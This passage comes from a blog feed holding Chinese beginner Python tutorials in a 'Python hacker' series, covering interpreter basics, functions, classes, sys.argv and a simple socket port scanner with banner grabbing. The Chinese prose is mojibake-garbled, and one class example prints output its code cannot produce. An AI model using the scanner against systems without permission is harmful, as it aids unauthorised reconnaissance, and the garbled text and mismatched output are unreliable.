class="line">&gt;&gt;&gt;</div></pre></div></div></figure><p>å¦‚æœæˆ‘ä»¬æƒ³ä¸€æ¬¡æ€§æ‰«æå¤šå°ä¸»æœºï¼Œå¯ä»¥ä½¿ç”¨ä¸€ä¸ªforå¾ªç¯åµŒå¥—ã€‚æœ€å¤–å±‚çš„æ˜¯ä¸»æœºçš„ipï¼Œç„¶åé‡Œé¢çš„forå¾ªç¯æ˜¯ç«¯å£ã€‚ä¸‹é¢æœ‰ä¸€ä¸ªåŸºç¡€çš„ä¾‹å­ï¼Œå±•ç¤ºäº†å¦‚ä½•é€šè¿‡å¾ªç¯åµŒå¥—æ¥æ„å»ºä¸€ä¸ªç®€å•çš„æ‰«æå™¨:</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></div><div class="code"><pre><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>hosts = [<span class="string">'127.0.0.1'</span>, <span class="string">'192.168.1.5'</span>, <span class="string">'10.0.0.1'</span>]</div><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>ports = [<span class="number">22</span>, <span class="number">445</span>, <span class="number">80</span>, <span class="number">443</span>, <span class="number">3389</span>]</div><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> host <span class="keyword">in</span> hosts:</div><div class="line"><span class="meta">... </span>  <span class="keyword">for</span> port <span class="keyword">in</span> ports:</div><div class="line"><span class="meta">... </span>    <span class="keyword">try</span>:</div><div class="line"><span class="meta">... </span>       <span class="keyword">print</span> <span class="string">"[+] Connecting to "</span>+host+<span class="string">":"</span>+str(port)</div><div class="line"><span class="meta">... </span>       s.connect((host, port))</div><div class="line"><span class="meta">... </span>       s.send(<span class="string">'Primal Security \n'</span>)</div><div class="line"><span class="meta">... </span>       banner = s.recv(<span class="number">1024</span>)</div><div class="line"><span class="meta">... </span>       <span class="keyword">if</span> banner:</div><div class="line"><span class="meta">... </span>         <span class="keyword">print</span> <span class="string">"[+] Port "</span>+str(port)+<span class="string">" open: "</span>+banner</div><div class="line"><span class="meta">... </span>       s.close()</div><div class="line"><span class="meta">... </span>    <span class="keyword">except</span>:<span class="keyword">pass</span></div><div class="line">...</div><div class="line">[+] Connecting to <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">22</span></div><div class="line">[+] Port <span class="number">22</span> open: OpenSSH</div><div class="line">[+] Connecting to <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">445</span></div><div class="line">[+] Connecting to <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">80</span></div><div class="line">[+] Connecting to <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">443</span></div><div class="line">[+] Connecting to <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">3389</span></div><div class="line">[+] Connecting to <span class="number">192.168</span><span class="number">.1</span><span class="number">.5</span>:<span class="number">22</span></div><div class="line">[+] Connecting to <span class="number">192.168</span><span class="number">.1</span><span class="number">.5</span>:<span class="number">445</span></div><div class="line">[+] Connecting to <span class="number">192.168</span><span class="number">.1</span><span class="number">.5</span>:<span class="number">80</span></div><div class="line">[+] Connecting to <span class="number">192.168</span><span class="number">.1</span><span class="number">.5</span>:<span class="number">443</span></div><div class="line">[+] Connecting to <span class="number">192.168</span><span class="number">.1</span><span class="number">.5</span>:<span class="number">3389</span></div><div class="line">[+] Connecting to <span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">22</span></div><div class="line">[+] Connecting to <span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">445</span></div><div class="line">[+] Connecting to <span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">80</span></div><div class="line">[+] Connecting to <span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">443</span></div><div class="line">[+] Connecting to <span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">3389</span></div></pre></div></div></figure><p>æ­£å¦‚ä½ æ‰€çœ‹åˆ°çš„ç»“æœï¼Œå®ƒæŠŠ<code>hosts</code>æ•°ç»„é‡Œé¢çš„æ‰€æœ‰å€¼éƒ½éå†äº†ä¸€æ¬¡<code>ports</code>æ•°ç»„ï¼Œç­‰<strong>hosts[0]</strong>æ‰«æå®Œæˆä¹‹åå†æ‰«æ<strong>hosts[1]</strong>ä¾æ¬¡ç±»æ¨ã€‚åœ¨è¿™ä¸ªä¾‹å­é‡Œé¢ä½ ä¹Ÿå¯ä»¥ä¿®æ”¹é‡Œé¢çš„ä»£ç ï¼Œåªè®©å®ƒæ˜¾ç¤ºå‡ºå¯ä»¥æ‰“å¼€çš„ç«¯å£ã€‚</p><blockquote><p>åœ¨è¿™æœ€åï¼Œä½ ä¼šå‘ç°è¿˜æ˜¯Nmapæœ€å¥½ç”¨ï¼Œä½†æ˜¯æˆ‘ä»¬å°†åœ¨åé¢çš„æ–‡ç« é‡Œé¢ç»§ç»­å®Œå–„è¿™ä¸ªå®ä¾‹ï¼Œå¤§å®¶å¯ä»¥èŠ±ç‚¹æ—¶é—´å»å­¦ä¹ ä¸€äº›socketæ¨¡å—å…¶ä»–çš„åŠŸèƒ½å‡½æ•°ï¼Œå¤§å®¶å¯ä»¥ä½¿ç”¨<code>dir(socket)</code>æ¥äº†è§£æ›´å¤šï¼Œå½“ç„¶è¿˜æœ‰<code>help()</code>.ä¸‹ä¸€ç« </p></blockquote>]]></content>
      
      <categories>
          
          <category> Python </category>
          
          <category> Hacker </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Pythoné»‘å®¢ä¹‹æ—…0x1</title>
      <link href="/2015/10/13/pythonhacker_0x1/"/>
      <url>/2015/10/13/pythonhacker_0x1/</url>
      <content type="html"><![CDATA[<h1 id="å…¥é—¨-2"><a href="#å…¥é—¨-2" class="headerlink" title="å…¥é—¨(2)"></a>å…¥é—¨(2)</h1><p>è¿™ä¸€ç« å°†ç»§ç»­è®²è§£ä¸€äº›åŸºç¡€çš„Pythonè„šæœ¬æ¦‚å¿µ,æˆ‘ä»¬å°†æŠŠä»£ç å†™å…¥åˆ°ä¸€ä¸ªè„šæœ¬é‡Œé¢ï¼Œå‡½æ•°ï¼Œç±»å’Œsysæ¨¡å—ã€‚</p><a id="more"></a><h2 id="Pythonè„šæœ¬æ¡†æ¶"><a href="#Pythonè„šæœ¬æ¡†æ¶" class="headerlink" title="Pythonè„šæœ¬æ¡†æ¶"></a>Pythonè„šæœ¬æ¡†æ¶</h2><p>ä¸‹é¢æ˜¯ä¸€ä¸ªå¼€å§‹å†™Pythonè„šæœ¬çš„åŸºç¡€ä¾‹å­ï¼Œå¼€å§‹éƒ¨åˆ†ï¼Œæˆ‘ä¹ˆå‘Šè¯‰ç³»ç»Ÿéœ€è¦ä½¿ç”¨é‚£ä¸€ä¸ªè§£é‡Šå™¨â€#!/usr/bin/env pythonâ€,ç„¶åæˆ‘ä»¬é€šè¿‡â€def main():â€å£°æ˜ä¸€ä¸ªmainå‡½æ•°,æœ€å2è¡Œä»£ç æœ‰mian()çš„å…ˆæ‰§è¡Œã€‚ä½ å¯ä»¥å®šä¹‰åœ¨ä½ çš„è„šæœ¬é‡Œé¢å®šä¹‰å…¶å®ƒå‡½æ•°ï¼Œè¿™æ ·ä½¿å¾—ä½ çš„ä»£ç æ›´å®¹æ˜“çš„ç†è§£å’Œä¿®æ”¹ç»´æŠ¤ï¼š</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></div><div class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="keyword">import</span> &lt;module1&gt;, &lt;module2&gt;</div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">myFunction</span><span class="params">()</span>:</span></div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">        myFunction()</div><div class="line"> </div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">        main()</div></pre></div></div></figure><h2 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h2><p> ä¸€ç§å¸¸è§çš„å†™æ³•æ˜¯æŠŠæ¯ä¸ªåŠŸèƒ½å‡½æ•°åˆ†å¼€å†™ï¼Œæ‰§è¡Œä¸€äº›æ“ä½œä¹‹åç„¶åè¿”å›ç»“æœã€‚ä¸‹é¢çš„è¿™ä¸ªä¼ªä»£ç æ¼”ç¤ºçš„ä¾‹å­å°±èƒ½å¤Ÿå¾ˆæ¸…æ™°çš„è§£é‡Šè¿™ä¸ªæ¦‚å¿µ:</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></div><div class="code"><pre><div class="line"><span class="comment"># å£°æ˜å‡½æ•°/é€»è¾‘å¤„ç†</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">MyFunction</span>:</span></div><div class="line">  ...do work...</div><div class="line">  <span class="keyword">return</span> output</div><div class="line"> </div><div class="line"><span class="comment">#åœ¨mainå‡½æ•°é‡Œé¢è°ƒç”¨:</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">  output = MyFunction(input)</div></pre></div></div></figure><h2 id="ç±»"><a href="#ç±»" class="headerlink" title="ç±»"></a>ç±»</h2><p>Pythonç±»å¼€å§‹ä½¿ç”¨çš„æ—¶å€™ä¼šæœ‰ç‚¹å›°éš¾ï¼Œå› ä¸ºå®ƒæ˜¯æ•™ä½ ä»¥ä½•ç§æ–¹å¼è®¾è®¡ä½ çš„ä»£ç ï¼Œå¦‚æœä½ æŒæ¡ç±»çš„æ¦‚å¿µé‚£ä¹ˆä½ å°±å¯ä»¥æŠŠæ•°æ®å’Œå®šä¹‰æŒ‰ç…§ç±»çš„é€»è¾‘åˆ†ç»„ï¼Œè¿™æ ·ç±»å°±æ‹¥æœ‰äº†å±æ€§å’Œä¸ä¹‹æƒ³å…³è”çš„æ–¹æ³•ã€‚å½“ä½ å®šä¹‰ä¸€ä¸ªç±»ä¹‹åï¼Œä½ å¯ä»¥åˆ›å»ºä¸€ä¸ªæ–°çš„ç±»ï¼Œç„¶åç»§æ‰¿ä¹‹å‰åˆ›å»ºçš„ç±»çš„å±æ€§å’Œä¸ä¹‹ç›¸å…³è”çš„æ–¹æ³•ï¼Œè¿™ç¼–ç¨‹å°±å«åšé¢å‘å¯¹è±¡ç¼–ç¨‹ã€‚</p><p>å¦‚æœä½ æ„Ÿåˆ°è¿·æƒ‘ï¼Œé‚£ä¹ˆæˆ‘å»ºè®®ä½ å…ˆä¸è¦å»å­¦ä¹ ç±»ï¼Œå®é™…ä¸Šï¼Œä½ å¹¶ä¸éœ€è¦ç±»ã€‚ä½†å®ƒå¯ä»¥è®©ä½ çš„ä»£ç å‡å°‘å†—ä½™ã€‚ä¸‹é¢æˆ‘ä»¬å°†å®šä¹‰ä¸ªæ–°çš„ç±»â€Domainâ€ä½¿ç”¨â€classâ€å…³é”®å­—ï¼Œå½“ä½ å®ä¾‹åŒ–Domainç±»å‹å¯¹è±¡çš„æ—¶å€™ï¼Œå®ƒçš„ç±»å‹æœ‰å¤šç§æ–¹å¼å»å®šä¹‰:</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></div><div class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">Domain</span>:</span></div><div class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, domain, port, protocol)</span>:</span></div><div class="line"><span class="comment">#é€šè¿‡ä¸¤ä¸ªå†…éƒ¨å˜é‡å­˜å‚¨å˜é‡</span></div><div class="line"><span class="meta">... </span>      self.domain=domain</div><div class="line"><span class="meta">... </span>      self.port=port</div><div class="line"><span class="meta">... </span>      self.protocol=protocol</div><div class="line"><span class="comment">#æ„é€ ä¸€ä¸ªurlçš„æ–¹æ³•</span></div><div class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">URL</span><span class="params">(self)</span>:</span></div><div class="line"><span class="meta">... </span>      <span class="keyword">if</span> self.protocol == <span class="string">'https'</span>:</div><div class="line"><span class="meta">... </span>        URL = <span class="string">'https://'</span>+self.domain+<span class="string">':'</span>+self.port+<span class="string">'/'</span></div><div class="line"><span class="meta">... </span>      <span class="keyword">if</span> self.protocol == <span class="string">'http'</span>:</div><div class="line"><span class="meta">... </span>        URL = <span class="string">'http://'</span>+self.domain+<span class="string">':'</span>+self.port+<span class="string">'/'</span></div><div class="line"><span class="meta">... </span>        <span class="keyword">return</span> URL</div><div class="line"><span class="comment"># è°ƒç”¨os.systemä¸­ä¸»æœºå‘½ä»¤lookupå»è§£æåŸŸå</span></div><div class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">lookup</span><span class="params">(self)</span>:</span></div><div class="line"><span class="meta">... </span>      os.system(<span class="string">"host "</span>+self.domain)</div><div class="line">...</div><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>domain=Domain(<span class="string">'google.com'</span>, <span class="string">'443'</span>, <span class="string">'https'</span>)</div><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>dir(domain)</div><div class="line">[<span class="string">'URL'</span>, <span class="string">'__doc__'</span>, <span class="string">'__init__'</span>, <span class="string">'__module__'</span>, <span class="string">'ip'</span>, <span class="string">'lookup'</span>, <span class="string">'port'</span>, <span class="string">'protocol'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>domain.URL()</div><div class="line"><span class="string">'https://8.8.8.8:443/'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>domain.ip</div><div class="line"><span class="string">'8.8.8.8'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>domain.port</div><div class="line"><span class="string">'443'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>domain.protocol</div><div class="line"><span class="string">'https'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>domain.lookup()</div><div class="line">google.com has address <span class="number">74.125</span><span class="number">.228</span><span class="number">.233</span></div><div class="line">google.com has address <span class="number">74.125</span><span class="number">.228</span><span class="number">.227</span></div><div class="line">google.com has address <span class="number">74.125</span><span class="number">.228</span><span class="number">.232</span></div></pre></div></div></figure><p>æ­£å¦‚ä½ æ‰€çœ‹åˆ°çš„ï¼Œå½“ä½ å®ä¾‹åŒ–ä¸€ä¸ªDomianç±»ä¹‹åä½ å¯ä»¥è¿è¡Œç±»ä¸­çš„æ–¹æ³•ã€‚å†æ¬¡è¯´å£°ï¼Œè¿™ä¸ªæ¦‚å¿µæœ€åˆçš„æ—¶å€™å¾ˆå®¹æ˜“æ··ä¹±ï¼Œå°¤å…¶æ˜¯å½“ä½ åˆšåˆšPythonå’Œç¼–ç¨‹çš„æ—¶å€™ã€‚å°è¯•ä¸€ä¸‹å»å®ç°ä¸€ä¸ªæ–°çš„ç±»åœ¨ä½ çš„Pythonè„šæœ¬é‡Œé¢ï¼Œæˆ‘å‘ç°è¿™æ˜¯æŒæ¡è¿™ä¸ªæ¦‚å¿µæœ€å¥½çš„é€”å¾„ã€‚</p><h2 id="ä½¿ç”¨syså¤„ç†å‘½ä»¤è¡Œè¾“å…¥å€¼"><a href="#ä½¿ç”¨syså¤„ç†å‘½ä»¤è¡Œè¾“å…¥å€¼" class="headerlink" title="ä½¿ç”¨syså¤„ç†å‘½ä»¤è¡Œè¾“å…¥å€¼"></a>ä½¿ç”¨syså¤„ç†å‘½ä»¤è¡Œè¾“å…¥å€¼</h2><p>æœ€å¥½æˆ‘ä»¬æ¥ä»‹ç»ä¸€ä¸‹sysæ¨¡å—ï¼Œå®ƒå¯ä»¥è®©ä½ è¯»å–ä»å‘½ä»¤ç»ˆç«¯è¾“å…¥çš„å€¼å¹¶ä¸”å¸®ä½ å¼•å…¥åˆ°è„šæœ¬é‡Œé¢ï¼Œå®ƒçš„è¯­æ³•å¾ˆç®€å•ï¼Œsys.agrv[0]å°±æ˜¯ä¸€ä¸ªå®é™…çš„è„šæœ¬åï¼Œå¹¶åœ¨å‘½ä»¤è¡ŒæŒ‡å®šçš„æ¯ä¸ªå‚æ•°åé¢åˆ†é…ä¸€ä¸ªä¸‹æ ‡ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„ä¾‹å­:</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></div><div class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line">script = sys.argv[<span class="number">0</span>]</div><div class="line">ip = sys.argv[<span class="number">1</span>]</div><div class="line">port = sys.argv[<span class="number">2</span>]</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"[+] The script name is: "</span>+script</div><div class="line"><span class="keyword">print</span> <span class="string">"[+] The IP is: "</span>+ip+<span class="string">" and the port is: "</span>+port</div></pre></div></div></figure><p>å½“æ‰§è¡Œè¿™ä¸ªè„šæœ¬çš„æ—¶å€™ï¼Œå¹¶ä¸”åé¢è·Ÿä¸‰ä¸ªå‚æ•°æ‰§è¡Œä¹‹åçš„ç»“æœå¦‚ä¸‹:</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">~$ python sys.py <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span> <span class="number">53</span></div><div class="line">[+] The script name <span class="keyword">is</span>: sys.py</div><div class="line">[+] The IP <span class="keyword">is</span>: <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span> <span class="keyword">and</span> the port <span class="keyword">is</span>: <span class="number">53</span></div></pre></div></div></figure><blockquote><p>ä¸Šé¢çš„åªæ˜¯ä¸€ä¸ªä¾‹å­ï¼Œå¤§å®¶å¯ä»¥ç»§ç»­å»ç ”ç©¶å…¶å®ƒPythonæ¨¡å—ï¼Œå› ä¸ºå®ƒä»¬èƒ½å¤Ÿæ”¾ä½ ç”¨æœ€ç®€å•çš„æ–¹å¼è§£å†³ä½ é‡åˆ°çš„é—®é¢˜ã€‚ä¸‹ä¸€ç« å°†ä¼šä»‹ç»ä½¿ç”¨Pythonè¿›è¡Œç½‘ç»œè¿æ¥å¹¶ä¸”å†™å‡ºä¸€ä¸ªåŸºç¡€çš„æ‰«æå™¨.</p></blockquote>]]></content>
      
      <categories>
          
          <category> Python </category>
          
          <category> Hacker </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Pythoné»‘å®¢ä¹‹æ—…0x0</title>
      <link href="/2015/10/12/pythonhacker_0x0/"/>
      <url>/2015/10/12/pythonhacker_0x0/</url>
      <content type="html"><![CDATA[<h2 id="å…¥é—¨"><a href="#å…¥é—¨" class="headerlink" title="å…¥é—¨"></a>å…¥é—¨</h2><p> è¿™å°†æ˜¯ç¬¬ä¸€ä¸ªä¸€ç³»åˆ—å…³äºpythonç¼–ç¨‹çš„åšå®¢æ–‡ç« ã€‚pythonæ˜¯ä¸€é—¨éå¸¸å¼ºå¤§çš„è¯­è¨€ï¼Œå› ä¸ºå®ƒæœ‰ä¿¡æ¯å®‰å…¨ç¤¾åŒºçš„æ”¯æ’‘ã€‚è¿™æ„å‘³ç€å¾ˆå¤šå·¥å…·éƒ½æ˜¯ç”±pythonç¼–å†™å¹¶ä¸”å¯ä»¥åœ¨è„šæœ¬ä¸­è°ƒç”¨å¾ˆå¤šæ¨¡å—ã€‚ä½¿ç”¨æ¨¡å—çš„å¥½å¤„å°±æ˜¯åªéœ€è¦å°‘é‡çš„ä»£ç å°±èƒ½å¤Ÿå®Œæˆæ‰€éœ€çš„ä»»åŠ¡ã€‚</p><p> è¿™ç¯‡æ–‡ç« å‡å®šä½ çš„ç³»ç»Ÿæ˜¯Linuxï¼Œpythonç‰ˆæœ¬æ˜¯2.*ã€‚åœ¨å†™ä»£ç çš„æ—¶å€™ä½ ä¹Ÿå¯ä»¥ç›´æ¥çš„å†™åœ¨è§£é‡Šå™¨é‡Œé¢(linuxé‡Œé¢è¾“å…¥pythonå³å¯è¿›å…¥)ï¼Œä¹Ÿå¯ä»¥æŠŠä»£ç æ”¾åˆ°ä¸€ä¸ªæ–‡ä»¶é‡Œé¢ã€‚å¾ˆå¤šäººä¼šå‘ç°æŠŠä»£ç å­˜æ”¾åˆ°æ–‡ä»¶é‡Œé¢è¦æ¯”ç›´æ¥å†™åœ¨è§£é‡Šå™¨ä¸Šé¢è¦å¥½å¾ˆå¤šã€‚å€¼å¾—æ³¨æ„çš„æ˜¯python ä¸­å¼ºåˆ¶ç¼©è¿›ã€‚å¤§å®¶åœ¨å†™å‡½æ•°å£°æ˜ï¼Œå¾ªç¯ï¼Œif/elseè¯­å¥ç­‰ç­‰çš„æ—¶å€™å°±ä¼šå‘ç°ã€‚</p><a id="more"></a><h3 id="pythonè§£é‡Šå™¨"><a href="#pythonè§£é‡Šå™¨" class="headerlink" title="pythonè§£é‡Šå™¨"></a>pythonè§£é‡Šå™¨</h3><p>åœ¨ç»ˆç«¯é‡Œé¢è¾“å…¥python:</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div class="code"><pre><div class="line">~$ python</div><div class="line">Python <span class="number">2.7</span><span class="number">.6</span> (default, Mar <span class="number">22</span> <span class="number">2014</span>, <span class="number">22</span>:<span class="number">59</span>:<span class="number">56</span>) </div><div class="line">[GCC <span class="number">4.8</span><span class="number">.2</span>] on linux2</div><div class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> <span class="keyword">or</span> <span class="string">"license"</span> <span class="keyword">for</span> more information.</div><div class="line">&gt;&gt;&gt;</div></pre></div></div></figure><p>è¾“å…¥ä¹‹åä½ å°±å¯ä»¥ç›´æ¥åœ¨è§£é‡Šå™¨é‡Œé¢å†™ä½ çš„ä»£ç äº†ã€‚ä¸‹é¢æˆ‘ä»¬å°†å£°æ˜ä¸¤ä¸ªå˜é‡ï¼Œå¹¶ä¸”ä½¿ç”¨type()å‡½æ•°æŸ¥çœ‹å˜é‡çš„ç±»å‹ã€‚å‡è®¾æˆ‘ä»¬å£°æ˜äº†ä¸€ä¸ªå­—ç¬¦ä¸²å’Œæ•´å‹ï¼š</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></div><div class="code"><pre><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>ip = <span class="string">'8.8.8.8'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>port = <span class="number">53</span></div><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>type(ip)</div><div class="line">&lt;type <span class="string">'str'</span>&gt;</div><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>type(port)</div><div class="line">&lt;type <span class="string">'int'</span>&gt;</div><div class="line">&gt;&gt;&gt;</div></pre></div></div></figure><p>ä½ å¯ä»¥ä½¿ç”¨å†…ç½®çš„help()å‡½æ•°å»äº†è§£ä¸€ä¸ªå‡½æ•°çš„è¯¦ç»†ã€‚è®°ä½è¿™ä¸€ç‚¹ï¼Œå®ƒå¯ä»¥å¸®åŠ©ä½ åœ¨å­¦ä¹ è¯­è¨€çš„æ—¶å€™å­¦ä¹ åˆ°æ›´å¤šçš„è¯¦ç»†å†…å®¹.</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>help(type)</div><div class="line">&gt;&gt;&gt;</div></pre></div></div></figure><p>æœ‰æ—¶ä½ ä¼šæƒ³æŠŠä¸€äº›å˜é‡å’Œå­—ç¬¦ä¸²è¿æ¥èµ·æ¥ç„¶åé€šè¿‡è„šæœ¬æ˜¾ç¤ºå‡ºæ¥ã€‚é‚£ä¹ˆä½ å°±éœ€è¦ä½¿ç”¨str()å‡½æ•°æŠŠæ•´å‹è½¬æ¢æˆå­—ç¬¦ä¸²ç±»å‹</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></div><div class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>ip=<span class="string">'1.1.1.1'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>port=<span class="number">55</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> <span class="string">'the ip is:'</span>+ip+<span class="string">'and the port is:'</span>+str(port)</div><div class="line">the ip <span class="keyword">is</span>:<span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span><span class="keyword">and</span> the port <span class="keyword">is</span>:<span class="number">55</span></div></pre></div></div></figure><p>å‰é¢å£°æ˜å˜é‡çš„æ—¶å€™â€IPâ€å°±æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²å°±ä¸éœ€è¦è½¬æ¢ï¼Œè€Œâ€portâ€å°±éœ€è¦ã€‚ç°åœ¨ä½ å°±å·²ç»çŸ¥é“äº†ä¸¤ä¸ªåŸºæœ¬çš„æ•°æ®ç±»å‹(stringå’Œinteger)ã€‚ç°åœ¨ä½ å¯ä»¥è¯•è¯•ä½¿ç”¨å†…ç½®å‡½æ•°ä¸è¿™ä¸¤ä¸ªæ•°æ®ç±»å‹å†™å‡ºå…¶ä»–çš„ä»£ç ã€‚</p><p>Pythonå­—ç¬¦ä¸²å…è®¸ä½ é€šè¿‡åç§»å€¼æ¥è·å–ä½ æƒ³éœ€è¦çš„å­—ç¬¦ä¸²,å¹¶ä¸”å¯ä»¥é€šè¿‡len()å‡½æ•°æ¥è·å–å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œå®ƒå¯ä»¥å¸®åŠ©ä½ æ›´æ–¹ä¾¿çš„æ“ä½œå­—ç¬¦ä¸²ã€‚</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></div><div class="code"><pre><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>domain=<span class="string">'primalsecurity.net'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>domain</div><div class="line"><span class="string">'primalsecurity.net'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>domain[<span class="number">0</span>]</div><div class="line"><span class="string">'p'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>domain[<span class="number">0</span>:<span class="number">3</span>]</div><div class="line"><span class="string">'pri'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>domain[<span class="number">1</span>:]</div><div class="line"><span class="string">'rimalsecurity.net'</span></div><div class="line"> </div><div class="line"><span class="meta">&gt;&gt;&gt; </span>len(domain)</div><div class="line"><span class="number">18</span></div></pre></div></div></figure><p>ä½ å¯ä»¥ä½¿ç”¨å†…å»ºçš„dir()å‡½æ•°æ¥åˆ—å‡ºæ¨¡å—å®šä¹‰çš„æ ‡è¯†ç¬¦ã€‚æ ‡è¯†ç¬¦æœ‰å‡½æ•°ã€ç±»å’Œå˜é‡ã€‚</p><figure class="highlight python"><div 